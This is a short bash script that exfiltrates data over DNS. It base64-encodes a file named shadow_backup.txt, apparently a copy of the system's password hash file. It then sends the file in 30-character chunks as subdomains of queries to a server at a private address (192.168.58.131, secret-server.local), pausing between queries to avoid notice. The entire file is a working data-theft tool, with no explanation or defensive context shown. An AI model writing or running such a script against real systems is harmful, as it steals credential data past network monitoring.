#!/bin/bash

PAYLOAD=$(cat shadow_backup.txt | base64 -w 0)

echo $PAYLOAD | fold -w 30 | while read CHUNK; do

dig @192.168.58.131 "$CHUNK.secret-server.local"

sleep 1

done
